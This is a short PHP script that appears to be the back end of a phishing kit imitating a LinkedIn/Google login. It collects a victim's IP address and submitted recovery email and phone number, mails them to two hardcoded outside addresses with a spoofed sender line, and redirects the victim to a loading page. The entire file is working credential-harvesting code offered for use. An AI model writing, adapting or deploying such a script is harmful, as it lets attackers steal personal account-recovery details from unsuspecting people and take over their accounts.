<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$username = $_POST['RecEmail'];
$phonenum = $_POST['PhNum'];
$chasem3="cokerconsultancy8119@gmail.com, chrisyoungmusic6@yahoo.com";


  $subj = "New LinkedinGoogle Login $ip";
  $msg = "Recovery email: $username\nPhone Num: $phonenum\n$ip\n-----------------------------------\n      Live  Created By Coke\n-----------------------------------";
  $from = "From: <ssc@sscs.com>";
    mail("$chasem3", $subj, $msg, $from);
    
    header("Location: loading.html");

?> 
